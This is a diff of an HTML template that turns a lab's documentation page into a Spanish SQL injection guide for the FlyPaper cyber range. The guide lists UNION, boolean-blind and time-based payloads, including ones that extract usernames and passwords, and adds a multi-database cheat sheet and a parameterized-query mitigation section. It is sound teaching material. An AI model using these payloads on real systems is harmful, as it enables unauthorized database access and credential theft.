@@ -1,471 +1,717 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
+{% include 'partials/theme_head.html' %}
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>FlyPaper — Documentación de seguridad</title>
-<meta name="description" content="Análisis técnico de vulnerabilidades, writeups y teoría de seguridad web del laboratorio FlyPaper Corp." />
+<title>FlyPaper — Guía SQLi · Labs 01–04</title>
+<meta name="description" content="Guía de referencia y cheat sheet de Inyección SQL para el Cyber Range FlyPaper (Labs 01–04)." />
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    background: #0a0e1a;
-    color: #e4e6eb;
+    font-family: var(--font-ui);
+    background: var(--bg-base);
+    color: var(--text-main);
     min-height: 100vh;
-    font-size: 14px;
-    line-height: 1.6;
+    font-size: 15px;
+    line-height: 1.65;
   }
-  a { color: #a78bfa; text-decoration: none; }
+  a { color: var(--color-accent); text-decoration: none; }
   a:hover { text-decoration: underline; }
 
-  .navbar {
-    background: linear-gradient(180deg, #11162a 0%, #0d1220 100%);
-    border-bottom: 1px solid #1f2742;
-    padding: 16px 40px;
+  .doc-wrap {
+    max-width: 1240px;
+    margin: 0 auto;
+    padding: 36px 28px 72px;
+  }
+  .doc-hero {
+    margin-bottom: 28px;
+  }
+  .doc-kicker {
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: var(--color-accent);
+    margin-bottom: 10px;
+  }
+  .doc-hero h1 {
+    font-size: clamp(1.75rem, 3vw, 2.35rem);
+    font-weight: 800;
+    color: var(--text-main);
+    letter-spacing: -0.03em;
+    margin-bottom: 10px;
+  }
+  .doc-hero p {
+    color: var(--text-muted);
+    max-width: 62ch;
+    font-size: 15px;
+  }
+  .doc-badges {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin-top: 16px;
+  }
+  .doc-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    padding: 6px 12px;
+    border-radius: var(--radius-card, 10px);
+    border: 1px solid var(--border-color);
+    background: var(--bg-card);
+    color: var(--text-muted);
+    font-size: 12px;
+    box-shadow: var(--shadow-card);
+  }
+  .doc-badge i {
+    width: 7px; height: 7px; border-radius: 50%;
+    background: var(--color-accent);
+  }
+
+  .doc-layout {
+    display: grid;
+    grid-template-columns: minmax(0, 1fr) 280px;
+    gap: 28px;
+    align-items: start;
+  }
+  @media (max-width: 960px) {
+    .doc-layout { grid-template-columns: 1fr; }
+    .doc-wrap { padding: 24px 16px 56px; }
+    .doc-side { position: static !important; }
+  }
+
+  .doc-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border-color);
+    border-radius: var(--radius-card, 14px);
+    padding: 22px 24px;
+    margin-bottom: 18px;
+    box-shadow: var(--shadow-card);
+    backdrop-filter: blur(var(--glass-blur));
+    -webkit-backdrop-filter: blur(var(--glass-blur));
+    color: var(--text-main);
+  }
+  .doc-card h2 {
+    font-size: 1.25rem;
+    font-weight: 750;
+    margin-bottom: 12px;
+    color: var(--text-main);
+    letter-spacing: -0.02em;
+  }
+  .doc-card h3 {
+    font-size: 1.05rem;
+    font-weight: 700;
+    margin: 18px 0 8px;
+    color: var(--text-soft);
+  }
+  .doc-card h4 {
+    font-size: 0.95rem;
+    font-weight: 700;
+    margin: 14px 0 6px;
+    color: var(--color-accent);
+  }
+  .doc-card p, .doc-card li {
+    color: var(--text-muted);
+    font-weight: 500;
+  }
+  .doc-card ul, .doc-card ol {
+    margin: 8px 0 12px 1.2em;
+  }
+  .doc-card li { margin-bottom: 6px; }
+  .doc-card strong { color: var(--text-main); font-weight: 700; }
+
+  .step-list {
+    counter-reset: paso;
+    list-style: none;
+    margin-left: 0;
+    padding: 0;
+  }
+  .step-list > li {
+    counter-increment: paso;
+    position: relative;
+    padding: 12px 14px 12px 52px;
+    margin-bottom: 10px;
+    border: 1px solid var(--border-color);
+    border-radius: 10px;
+    background: var(--bg-input);
+  }
+  .step-list > li::before {
+    content: counter(paso);
+    position: absolute;
+    left: 12px;
+    top: 12px;
+    width: 28px;
+    height: 28px;
+    border-radius: 8px;
     display: flex;
     align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    font-weight: 800;
+    background: color-mix(in srgb, var(--color-accent) 18%, transparent);
+    color: var(--color-accent);
+    border: 1px solid var(--border-accent);
+  }
+
+  /* Bloques de código theme-reactive + scroll móvil */
+  .code-scroll {
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+    border-radius: 10px;
+    border: 1px solid var(--border-color);
+    background: var(--terminal-bg, var(--bg-input));
+    margin: 10px 0 14px;
+  }
+  .code-scroll pre {
+    margin: 0;
+    padding: 14px 16px;
+    font-family: ui-monospace, "Cascadia Code", "SF Mono", Menlo, Consolas, monospace;
+    font-size: 12.5px;
+    line-height: 1.55;
+    color: var(--terminal-fg, var(--text-main));
+    white-space: pre;
+    min-width: min-content;
+  }
+  .code-scroll code { color: inherit; background: none; padding: 0; }
+  .code-label {
+    display: inline-block;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    color: var(--text-muted);
+    margin-bottom: 4px;
+  }
+  .code-ok .code-scroll {
+    border-color: var(--alert-ok-border, var(--color-ok));
+    background: color-mix(in srgb, var(--color-ok) 8%, var(--bg-input));
+  }
+  .code-bad .code-scroll {
+    border-color: var(--alert-error-border, var(--color-err));
+    background: color-mix(in srgb, var(--color-err) 8%, var(--bg-input));
+  }
+
+  /* Cheat sheet */
+  .sheet-toolbar {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px;
+    align-items: center;
     justify-content: space-between;
+    margin-bottom: 12px;
+  }
+  .sheet-hint { font-size: 13px; color: var(--text-muted); }
+  .sheet-toggle {
+    appearance: none;
+    border: 1px solid var(--border-color);
+    background: var(--bg-input);
+    color: var(--text-main);
+    border-radius: 8px;
+    padding: 8px 12px;
+    font-size: 12px;
+    font-weight: 650;
+    cursor: pointer;
+  }
+  .sheet-toggle[aria-pressed="true"] {
+    border-color: var(--color-accent);
+    color: var(--color-accent);
+    background: color-mix(in srgb, var(--color-accent) 12%, transparent);
+  }
+  .table-scroll {
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+    border: 1px solid var(--border-color);
+    border-radius: 12px;
+  }
+  table.cheat-sheet {
+    width: 100%;
+    border-collapse: collapse;
+    min-width: 860px;
+    font-size: 12.5px;
+  }
+  table.cheat-sheet th,
+  table.cheat-sheet td {
+    border-bottom: 1px solid var(--border-color);
+    border-right: 1px solid color-mix(in srgb, var(--border-color) 70%, transparent);
+    padding: 10px 12px;
+    text-align: left;
+    vertical-align: top;
+    color: var(--text-muted);
+  }
+  table.cheat-sheet th {
+    background: var(--bg-input);
+    color: var(--text-main);
+    font-weight: 700;
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
     position: sticky;
     top: 0;
-    z-index: 100;
-    box-shadow: 0 2px 20px rgba(0,0,0,0.4);
+    z-index: 1;
   }
-  .logo {
-    font-size: 24px;
+  table.cheat-sheet tr:last-child td { border-bottom: none; }
+  table.cheat-sheet td:first-child,
+  table.cheat-sheet th:first-child {
+    color: var(--text-main);
+    font-weight: 650;
+    white-space: nowrap;
+  }
+  table.cheat-sheet code {
+    font-family: ui-monospace, "Cascadia Code", Menlo, Consolas, monospace;
+    font-size: 11.5px;
+    color: var(--text-soft);
+    background: color-mix(in srgb, var(--bg-base) 40%, transparent);
+    padding: 1px 4px;
+    border-radius: 4px;
+  }
+  /* Marcador visual: columna SQLite (motor local FlyPaper) */
+  table.cheat-sheet th.col-sqlite,
+  table.cheat-sheet td.col-sqlite {
+    background: color-mix(in srgb, var(--color-accent) 14%, var(--bg-card));
+    border-color: color-mix(in srgb, var(--color-accent) 35%, var(--border-color));
+    color: var(--text-main);
+    font-weight: 600;
+  }
+  table.cheat-sheet th.col-sqlite {
+    box-shadow: inset 0 -2px 0 var(--color-accent);
+  }
+  table.cheat-sheet td.col-sqlite code {
+    color: var(--color-accent);
+    font-weight: 700;
+  }
+  .sqlite-pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    margin-left: 8px;
+    padding: 2px 8px;
+    border-radius: 999px;
+    font-size: 10px;
     font-weight: 800;
-    background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    background-clip: text;
-    letter-spacing: -0.5px;
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    background: color-mix(in srgb, var(--color-accent) 18%, transparent);
+    color: var(--color-accent);
+    border: 1px solid var(--border-accent);
+    vertical-align: middle;
   }
-  .logo::before { content: "✈ "; -webkit-text-fill-color: #6366f1; }
-  .nav-links { display: flex; gap: 8px; list-style: none; }
-  .nav-links li { list-style: none; }
-  .nav-links a {
-    color: #b4b8c5;
-    text-decoration: none;
-    padding: 8px 16px;
-    border-radius: 8px;
+  body.sheet-focus-sqlite table.cheat-sheet th:not(.col-sqlite):not(:first-child),
+  body.sheet-focus-sqlite table.cheat-sheet td:not(.col-sqlite):not(:first-child) {
+    opacity: 0.28;
+    filter: saturate(0.4);
+  }
+
+  .callout {
+    border-left: 3px solid var(--color-accent);
+    background: color-mix(in srgb, var(--color-accent) 8%, var(--bg-input));
+    padding: 12px 14px;
+    border-radius: 0 10px 10px 0;
+    margin: 12px 0;
+    color: var(--text-soft);
     font-size: 14px;
-    font-weight: 500;
-    transition: all 0.2s;
   }
-  .nav-links a:hover { background: #1a2138; color: #fff; text-decoration: none; }
-  .nav-links a.active { background: #1a2138; color: #fff; }
-
-  .container { max-width: 1280px; margin: 0 auto; padding: 48px 40px 64px; }
-  .page-header { margin-bottom: 28px; }
-  .page-header h1 {
-    font-size: 36px;
-    font-weight: 800;
-    color: #fff;
-    margin-bottom: 8px;
-    letter-spacing: -0.5px;
+  .callout.warn {
+    border-left-color: var(--alert-warn-border, #c98900);
+    background: var(--alert-warn-bg, color-mix(in srgb, #eab308 12%, var(--bg-input)));
+    color: var(--alert-warn-fg, var(--text-main));
   }
-  .page-header p { color: #8b91a7; font-size: 15px; max-width: 720px; }
-  .hero-stats { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 18px; }
-  .stat-badge {
-    display: inline-flex; align-items: center; gap: 8px;
-    padding: 6px 12px; background: #141a2e; border: 1px solid #1f2742;
-    border-radius: 999px; font-size: 12px; color: #8b91a7;
-  }
-  .stat-badge .dot { width: 6px; height: 6px; border-radius: 50%; background: #6366f1; }
-  .stat-badge:nth-child(2) .dot { background: #f59e0b; }
-  .stat-badge:nth-child(3) .dot { background: #22c55e; }
-
-  .layout { display: grid; grid-template-columns: 1fr 300px; gap: 28px; }
-  @media (max-width: 980px) { .layout { grid-template-columns: 1fr; } .container { padding: 32px 20px 48px; } }
-
-  .cat-section { margin-bottom: 36px; }
-  .cat-header {
-    display: flex; align-items: center; gap: 12px; margin-bottom: 16px;
-    padding-left: 12px; border-left: 3px solid #1f2742;
-  }
-  .cat-section[data-cat="informe"] .cat-header { border-left-color: #f85149; }
-  .cat-section[data-cat="vulnerabilidad"] .cat-header { border-left-color: #f59e0b; }
-  .cat-section[data-cat="teoria"] .cat-header { border-left-color: #6366f1; }
-  .cat-section[data-cat="apuntes"] .cat-header { border-left-color: #22c55e; }
-  .cat-title { font-size: 20px; font-weight: 700; color: #fff; }
-  .cat-count { font-size: 11px; color: #8b91a7; text-transform: uppercase; letter-spacing: .08em; }
-
-  .article {
-    background: linear-gradient(180deg, #141a2e 0%, #11162a 100%);
-    border: 1px solid #1f2742; border-radius: 14px; padding: 24px;
-    margin-bottom: 16px; transition: border-color .2s, box-shadow .2s;
-  }
-  .article:hover { border-color: #3b3f6b; box-shadow: 0 8px 24px rgba(99,102,241,.12); }
-
-  .pill {
-    display: inline-flex; padding: 3px 10px; border-radius: 999px;
-    font-size: 10px; font-weight: 600; letter-spacing: .1em; text-transform: uppercase;
-  }
-  .pill.informe { color: #f85149; background: rgba(248,81,73,.12); border: 1px solid rgba(248,81,73,.25); }
-  .pill.vulnerabilidad { color: #f59e0b; background: rgba(245,158,11,.12); border: 1px solid rgba(245,158,11,.25); }
-  .pill.teoria { color: #a78bfa; background: rgba(167,139,250,.12); border: 1px solid rgba(167,139,250,.25); }
-  .pill.apuntes { color: #22c55e; background: rgba(34,197,94,.12); border: 1px solid rgba(34,197,94,.25); }
-
-  .article-title { font-size: 20px; font-weight: 700; margin: 12px 0 8px; color: #fff; line-height: 1.3; }
-  .article-meta { font-size: 12px; color: #8b91a7; margin-bottom: 12px; }
-  .article-meta .sep { margin: 0 6px; opacity: .5; }
-  .tags { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 14px; }
-  .tag {
-    font-size: 11px; color: #b4b8c5; background: #0d1220;
-    border: 1px solid #2a3454; padding: 3px 8px; border-radius: 6px;
-  }
-  .excerpt { color: #b4b8c5; font-size: 14px; line-height: 1.65; margin: 0 0 16px; }
-
-  .toc {
-    background: #0d1220; border: 1px solid #2a3454; border-radius: 10px;
-    padding: 14px 16px; margin-bottom: 16px;
-  }
-  .toc-title {
-    font-size: 11px; color: #8b91a7; text-transform: uppercase;
-    letter-spacing: .12em; margin-bottom: 10px; padding-bottom: 8px;
-    border-bottom: 1px dashed #2a3454;
-  }
-  .toc ol { margin: 0; padding: 0; list-style: none; counter-reset: idx; }
-  .toc li {
-    counter-increment: idx; padding: 4px 0 4px 28px; position: relative;
-    font-size: 13px; color: #8b91a7;
-  }
-  .toc li::before {
-    content: counter(idx, decimal-leading-zero); position: absolute; left: 0;
-    color: #a78bfa; font-size: 11px;
+  .callout.ok {
+    border-left-color: var(--alert-ok-border, var(--color-ok));
+    background: var(--alert-ok-bg, color-mix(in srgb, var(--color-ok) 10%, var(--bg-input)));
+    color: var(--alert-ok-fg, var(--text-main));
   }
 
-  .read-more {
-    display: inline-flex; align-items: center; gap: 6px;
-    padding: 8px 14px; background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
-    color: #fff; border: none; border-radius: 8px; font-size: 13px;
-    font-weight: 600; cursor: pointer;
+  .doc-side {
+    position: sticky;
+    top: 88px;
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
   }
-  .read-more:hover { opacity: .92; }
-
-  .sidebar { display: flex; flex-direction: column; gap: 16px; position: sticky; top: 88px; align-self: start; }
-  @media (max-width: 980px) { .sidebar { position: static; } }
-  .side-block {
-    background: linear-gradient(180deg, #141a2e 0%, #11162a 100%);
-    border: 1px solid #1f2742; border-radius: 14px; padding: 18px;
+  .toc-nav a {
+    display: block;
+    padding: 7px 10px;
+    border-radius: 8px;
+    color: var(--text-muted);
+    font-size: 13px;
+    text-decoration: none;
+    border: 1px solid transparent;
+  }
+  .toc-nav a:hover,
+  .toc-nav a.is-active {
+    color: var(--color-accent);
+    background: color-mix(in srgb, var(--color-accent) 10%, transparent);
+    border-color: color-mix(in srgb, var(--color-accent) 25%, transparent);
+    text-decoration: none;
   }
   .side-title {
-    font-size: 11px; color: #8b91a7; text-transform: uppercase;
-    letter-spacing: .12em; margin: 0 0 12px; font-weight: 600;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    color: var(--text-muted);
+    margin-bottom: 10px;
   }
-
-  .doc-search {
-    display: flex; border: 1px solid #2a3454; border-radius: 8px;
-    background: #0d1220; overflow: hidden;
+  .quick-links a {
+    display: flex;
+    justify-content: space-between;
+    padding: 8px 0;
+    border-bottom: 1px solid var(--border-color);
+    color: var(--text-main);
+    font-size: 13px;
+    font-weight: 600;
+    text-decoration: none;
   }
-  .doc-search input {
-    flex: 1; background: transparent; border: 0; outline: 0;
-    color: #e4e6eb; font-size: 13px; padding: 10px 12px;
+  .quick-links a:last-child { border-bottom: none; }
+  .quick-links a span { color: var(--color-accent); }
+
+  .doc-footer {
+    margin-top: 28px;
+    padding-top: 16px;
+    border-top: 1px solid var(--border-color);
+    text-align: center;
+    color: var(--text-muted);
+    font-size: 13px;
   }
-  .doc-search input::placeholder { color: #6b7289; }
-  .doc-search button {
-    background: transparent; border: 0; color: #8b91a7; padding: 0 12px;
-    cursor: pointer; border-left: 1px solid #2a3454;
-  }
-
-  .cat-list { display: flex; flex-direction: column; gap: 4px; }
-  .cat-btn {
-    display: flex; align-items: center; gap: 10px; width: 100%; text-align: left;
-    background: transparent; border: 1px solid transparent; border-radius: 8px;
-    padding: 8px 10px; color: #e4e6eb; font-size: 13px; cursor: pointer;
-    font-family: inherit;
-  }
-  .cat-btn:hover { background: #1a2138; }
-  .cat-btn.active { background: #1a2138; border-color: #3b3f6b; color: #fff; }
-  .cat-btn .swatch { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
-  .cat-btn .count { margin-left: auto; color: #8b91a7; font-size: 11px; }
-
-  .tagcloud { display: flex; flex-wrap: wrap; gap: 6px; }
-  .tagcloud .tag { cursor: default; }
-
-  .updates { list-style: none; margin: 0; padding: 0; display: flex; flex-direction: column; gap: 10px; }
-  .updates li { font-size: 13px; padding-left: 10px; border-left: 1px solid #2a3454; }
-  .updates time { display: block; font-size: 11px; color: #8b91a7; margin-bottom: 2px; }
-  .updates a { color: #e4e6eb; }
-  .updates a:hover { color: #a78bfa; text-decoration: none; }
-
-  .quick { display: flex; flex-direction: column; gap: 8px; }
-  .quick a {
-    display: flex; justify-content: space-between; padding: 10px 12px;
-    border-radius: 8px; font-size: 13px; font-weight: 500;
-    border: 1px solid #2a3454; background: #0d1220; color: #e4e6eb;
-  }
-  .quick a:hover { border-color: #6366f1; color: #a78bfa; text-decoration: none; }
-
-  .page-footer {
-    margin-top: 40px; padding-top: 20px; border-top: 1px solid #1f2742;
-    color: #8b91a7; font-size: 13px; text-align: center;
-  }
-
-  .hidden { display: none !important; }
 </style>
+{% include 'partials/theme_bridge.html' %}
 </head>
-<body>
+<body class="theme-aware">
+{% set nav_activo = 'documentacion' %}
+{% include 'partials/navbar_publico.html' %}
 
-  {% include 'partials/navbar_publico.html' %}
+<main class="doc-wrap">
+  <header class="doc-hero fade-in-blur">
+    <p class="doc-kicker">Cyber Range · Referencia técnica</p>
+    <h1>Guía SQLi — Labs 01–04</h1>
+    <p>
+      Cheat sheet y metodologías de explotación para el laboratorio FlyPaper.
+      Enfocado a SQLite (motor local) con equivalencias multi-DBMS para transferir el conocimiento a otros entornos.
+    </p>
+    <div class="doc-badges">
+      <span class="doc-badge"><i></i> Labs 01–04</span>
+      <span class="doc-badge"><i></i> UNION · Blind · Enum</span>
+      <span class="doc-badge"><i></i> Motor: SQLite</span>
+      <span class="doc-badge"><i></i> Blue Team</span>
+    </div>
+  </header>
 
-  <main class="container">
-    <div class="page-header">
-      <h1>Documentación de seguridad</h1>
-      <p>Análisis técnico de vulnerabilidades, writeups y teoría de seguridad web del laboratorio FlyPaper Corp.</p>
-      <div class="hero-stats">
-        <span class="stat-badge"><span class="dot"></span>14 documentos publicados</span>
-        <span class="stat-badge"><span class="dot"></span>4 categorías</span>
-        <span class="stat-badge"><span class="dot"></span>Actualizado junio 2026</span>
-      </div>
+  <div class="doc-layout">
+    <div class="doc-feed">
+
+      <!-- 1. Introducción -->
+      <section id="introduccion" class="doc-card glass-card fade-in-blur">
+        <h2>1. Introducción a la Inyección SQL</h2>
+        <p>
+          La <strong>inyección SQL (SQLi)</strong> ocurre cuando la aplicación concatena entrada de usuario
+          directamente en una consulta. Se rompe la frontera entre <em>código</em> (la sentencia SQL)
+          y <em>datos</em> (el valor del usuario): el atacante inyecta fragmentos que el motor interpreta
+          como lógica, no como literales.
+        </p>
+
+        <h3>Caso práctico — lógica del honeypot</h3>
+        <p class="code-label">Consulta base (vulnerable)</p>
+        <div class="code-scroll">
+          <pre><code>SELECT * FROM productos WHERE nombre = '$INPUT';</code></pre>
+        </div>
+
+        <p class="code-label">Payload de alteración de contexto</p>
+        <div class="code-scroll">
+          <pre><code>' OR '1'='1</code></pre>
+        </div>
+
+        <p class="code-label">Consulta resultante (devuelve todo el inventario)</p>
+        <div class="code-scroll">
+          <pre><code>SELECT * FROM productos WHERE nombre = '' OR '1'='1';</code></pre>
+        </div>
+
+        <div class="callout">
+          La condición <code>'1'='1'</code> es siempre verdadera: el filtro por nombre deja de limitar filas.
+          Es el mismo patrón que verás en Labs 01–02 cuando el buscador o el login concatenan sin parámetros.
+        </div>
+      </section>
+
+      <!-- 2. Metodologías -->
+      <section id="metodologias" class="doc-card glass-card fade-in-blur">
+        <h2>2. Metodologías de explotación (Labs 01–04)</h2>
+
+        <h3 id="union">A. UNION-based attacks</h3>
+        <p>
+          Combina el resultado de la consulta original con filas fabricadas por el atacante.
+          El número y tipos de columnas del <code>UNION SELECT</code> deben coincidir con la consulta víctima.
+        </p>
+
+        <ol class="step-list">
+          <li>
+            <strong>Determinar el número de columnas</strong>
+            <p style="margin-top:6px">
+              Incrementa <code>ORDER BY N</code> hasta provocar error, o prueba nulos:
+            </p>
+            <div class="code-scroll">
+              <pre><code>' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' UNION SELECT NULL,NULL--</code></pre>
+            </div>
+            <div class="callout warn">
+              La consulta falla hasta clavar el número exacto de columnas. Sin ese match, el UNION no ejecuta.
+            </div>
+          </li>
+          <li>
+            <strong>String mapping (columnas que admiten texto)</strong>
+            <p style="margin-top:6px">
+              Sustituye cada <code>NULL</code> por un literal de prueba (<code>'a'</code>) para ver qué posiciones
+              se reflejan en la UI sin romper el motor:
+            </p>
+            <div class="code-scroll">
+              <pre><code>' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT NULL,'a',NULL--
+' UNION SELECT NULL,NULL,'a'--</code></pre>
+            </div>
+          </li>
+          <li>
+            <strong>Exfiltración y concatenación</strong>
+            <p style="margin-top:6px">
+              Con pocas columnas de texto, unifica campos con el operador del DBMS
+              (en SQLite: <code>||</code>):
+            </p>
+            <div class="code-scroll">
+              <pre><code>' UNION SELECT username || ':' || password, NULL FROM usuarios--</code></pre>
+            </div>
+          </li>
+        </ol>
+
+        <h3 id="blind">B. Blind SQL Injection</h3>
+        <p>
+          Cuando no hay errores SQL ni datos reflejados, infieres verdad/falsedad por
+          cambios sutiles de respuesta o por tiempo.
+        </p>
+
+        <h4>1. Respuestas condicionales (boolean-based)</h4>
+        <p>
+          Observa diferencias HTML/cookies (p. ej. presencia de «WELCOME BACK»).
+          Compara afirmaciones verdaderas vs falsas:
+        </p>
+        <div class="code-scroll">
+          <pre><code>TrackingId: xyz' AND '1'='1
+TrackingId: xyz' AND '1'='0</code></pre>
+        </div>
+        <p>
+          Extrae caracteres con fuerza bruta + subcadena (base 1):
+        </p>
+        <div class="code-scroll">
+          <pre><code>' AND SUBSTR((SELECT password FROM usuarios LIMIT 1),1,1)='a'--</code></pre>
+        </div>
+
+        <h4>2. Time-based</h4>
+        <p>
+          Si el HTML no cambia, fuerza un delay solo cuando la condición es verdadera
+          (sintaxis según motor; en labs SQLite suele preferirse boolean/UNION).
+        </p>
+        <div class="code-scroll">
+          <pre><code>-- Ejemplo conceptual (MySQL): WAITFOR / SLEEP
+' AND IF(SUBSTR(@@version,1,1)='5', SLEEP(3), 0)--</code></pre>
+        </div>
+
+        <h3 id="enum">C. Enumeración de bases de datos</h3>
+        <ol class="step-list">
+          <li>
+            <strong>Identificar el DBMS</strong> — errores de sintaxis o funciones de versión
+            (<code>sqlite_version()</code>, <code>@@version</code>, <code>version()</code>.
+          </li>
+          <li>
+            <strong>Mapear tablas / esquema</strong> — en SQLite: <code>sqlite_master</code>.
+          </li>
+          <li>
+            <strong>Extraer credenciales</strong> — columnas de interés vía UNION o blind
+            una vez conocido el esquema.
+          </li>
+        </ol>
+        <div class="code-scroll">
+          <pre><code>SELECT tbl_name FROM sqlite_master WHERE type='table';
+SELECT sql FROM sqlite_master WHERE tbl_name='usuarios';</code></pre>
+        </div>
+      </section>
+
+      <!-- 3. Cheat sheet -->
+      <section id="cheat-sheet" class="doc-card glass-card fade-in-blur">
+        <h2>3. The Lab Cheat Sheet</h2>
+        <div class="sheet-toolbar">
+          <p class="sheet-hint">
+            Comparativa multi-motor. La columna
+            <strong class="theme-accent">SQLite</strong> es el núcleo de FlyPaper.
+          </p>
+          <button type="button" class="sheet-toggle" id="btn-focus-sqlite" aria-pressed="false">
+            Enfocar solo SQLite
+          </button>
+        </div>
+
+        <div class="table-scroll">
+          <table class="cheat-sheet" aria-label="Cheat sheet SQLi multi-DBMS">
+            <thead>
+              <tr>
+                <th scope="col">Característica / DBMS</th>
+                <th scope="col" class="col-sqlite">
+                  SQLite (Lab Core)
+                  <span class="sqlite-pill">Activo</span>
+                </th>
+                <th scope="col">Oracle</th>
+                <th scope="col">PostgreSQL</th>
+                <th scope="col">MySQL / MS-SQL</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>Comentarios</td>
+                <td class="col-sqlite"><code>-- comentario</code></td>
+                <td><code>-- comentario</code></td>
+                <td><code>--</code> o <code>/*...*/</code></td>
+                <td><code>#</code> o <code>-- </code> (con espacio)</td>
+              </tr>
+              <tr>
+                <td>Concatenación</td>
+                <td class="col-sqlite"><code>'foo' || 'bar'</code></td>
+                <td><code>'foo' || 'bar'</code></td>
+                <td><code>'foo' || 'bar'</code></td>
+                <td><code>CONCAT('foo','bar')</code> o <code>'foo'+'bar'</code></td>
+              </tr>
+              <tr>
+                <td>Substring (base 1)</td>
+                <td class="col-sqlite"><code>SUBSTR('foobar',4,2)</code></td>
+                <td><code>SUBSTR('foobar',4,2)</code></td>
+                <td><code>SUBSTRING('f',4,2)</code></td>
+                <td><code>SUBSTRING('foobar',4,2)</code></td>
+              </tr>
+              <tr>
+                <td>Versión del motor</td>
+                <td class="col-sqlite"><code>SELECT sqlite_version();</code></td>
+                <td><code>SELECT banner FROM v$version;</code></td>
+                <td><code>SELECT version();</code></td>
+                <td><code>SELECT @@version;</code></td>
+              </tr>
+              <tr>
+                <td>Mapeo de tablas</td>
+                <td class="col-sqlite"><code>SELECT tbl_name FROM sqlite_master WHERE type='table';</code></td>
+                <td><code>SELECT table_name FROM all_tables;</code></td>
+                <td><code>SELECT table_name FROM information_schema.tables;</code></td>
+                <td><code>SELECT table_name FROM information_schema.tables;</code></td>
+              </tr>
+              <tr>
+                <td>Mapeo de columnas</td>
+                <td class="col-sqlite"><code>SELECT sql FROM sqlite_master WHERE tbl_name='X';</code></td>
+                <td><code>SELECT column_name FROM all_tab_columns WHERE table_name='X';</code></td>
+                <td><code>SELECT column_name FROM information_schema.columns WHERE table_name='X';</code></td>
+                <td><code>SELECT column_name FROM information_schema.columns WHERE table_name='X';</code></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- 4. Blue Team -->
+      <section id="blue-team" class="doc-card glass-card fade-in-blur">
+        <h2>4. Perspectiva Blue Team — mitigación</h2>
+
+        <h3>El error clásico (estilo honeypot)</h3>
+        <p>
+          Los filtros por <em>blacklist</em> (quitar comillas, bloquear palabras clave como
+          <code>UNION</code> / <code>SELECT</code>) fallan ante ofuscación, encoding, comentarios
+          anidados y variantes por DBMS. Son útiles como señal WAF, no como control primario.
+        </p>
+        <div class="callout warn">
+          En FlyPaper el honeypot <em>intenta</em> ser explotable: el Black Team aprende el ataque;
+          el Blue Team debe aprender a no repetir el mismo fallo en código real.
+        </div>
+
+        <h3>La solución definitiva: consultas parametrizadas</h3>
+        <p>
+          Separa la plantilla SQL de los valores. El motor trata la entrada como literal,
+          nunca como sintaxis.
+        </p>
+
+        <div class="code-bad">
+          <p class="code-label">❌ Vulnerable (concatenación / f-string)</p>
+          <div class="code-scroll">
+            <pre><code>cursor.execute(f"SELECT * FROM usuarios WHERE id = '{user_id}'")</code></pre>
+          </div>
+        </div>
+
+        <div class="code-ok">
+          <p class="code-label">Código blindado (SQLite / Python)</p>
+          <div class="code-scroll">
+            <pre><code>cursor.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))</code></pre>
+          </div>
+        </div>
+
+        <div class="callout ok">
+          Misma idea en otros stacks: placeholders <code>%s</code> / named params, ORMs con bind,
+          prepared statements JDBC. Nunca interpoles input en el string SQL.
+        </div>
+      </section>
+
+      <p class="doc-footer">
+        FlyPaper Corp © 2026 — Documentación académica del Cyber Range. Tráfico monitorizado.
+      </p>
     </div>
 
-    <div class="layout">
-  <div class="feed">
-
-    <!-- INFORMES -->
-    <section class="cat-section" data-cat="informe">
-      <header class="cat-header">
-        <span class="pill informe">Informe</span>
-        <span class="cat-title">Informes</span>
-        <span class="cat-count">· 2 documentos</span>
-      </header>
-
-      <article class="article" data-cat="informe">
-        <span class="pill informe">Informe</span>
-        <h2 class="article-title">Análisis de tráfico bot en FlyPaper Honeypot — Mayo 2026</h2>
-        <div class="article-meta">08 jun 2026<span class="sep">·</span>12 min de lectura<span class="sep">·</span>Angel García</div>
-        <div class="tags"><span class="tag">Honeypot</span><span class="tag">Análisis</span><span class="tag">Tráfico Bot</span></div>
-        <p class="excerpt">Durante mayo se registraron 847 eventos únicos procedentes de 23 países. El 67% correspondió a escaneos automatizados con patrones de inyección SQL y path traversal. Se identificaron tres campañas coordinadas con intervalos de petición inferiores a 200ms.</p>
-        <div class="toc">
-          <div class="toc-title">Índice del documento</div>
-          <ol>
-            <li>Resumen ejecutivo</li>
-            <li>Metodología de captura</li>
-            <li>Distribución geográfica</li>
-            <li>Tipos de ataque detectados</li>
-            <li>IPs más activas</li>
-            <li>Conclusiones y recomendaciones</li>
-          </ol>
+    <aside class="doc-side">
+      <div class="doc-card glass-card fade-in-blur">
